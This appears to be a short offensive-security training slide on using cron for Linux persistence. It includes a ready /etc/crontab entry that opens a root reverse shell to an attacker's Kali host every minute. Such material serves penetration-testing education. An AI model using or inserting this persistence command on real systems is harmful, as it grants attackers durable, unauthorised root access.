Scheduling Malicious Cron Jobs

Executing payloads at regular intervals.

How Cron Works

  • Cron is a time-based job scheduler on Unix-like systems.
  • Entries in /etc/crontab or user-specific crontabs define scheduled tasks.
  • With root access, you can add entries to execute commands or scripts periodically.
  • Syntax: minute hour day_of_month month day_of_week user command.

Example Scenario

To ensure a reverse shell connects back to your Kali machine every minute, you add a specific entry to /etc/crontab. This provides a highly reliable, self-healing connection.

Key Takeaway

Cron jobs offer a powerful and reliable method for Linux persistence, ensuring automated execution of payloads at defined intervals.

Target Machine (Linux)
# Example cron job entry for a reverse shell every minute
# Add this to /etc/crontab or root's crontab:
* * * * * root /bin/bash -i >& /dev/tcp/YOUR_KALI_IP/4444 0>&1

Cron Syntax Breakdown:

  • *: Every minute
  • *: Every hour
  • *: Every day of the month
  • *: Every month
  • *: Every day of the week
  • root: User to run the command as
  • /bin/bash -i >& /dev/tcp/YOUR_KALI_IP/4444 0>&1: The reverse shell command
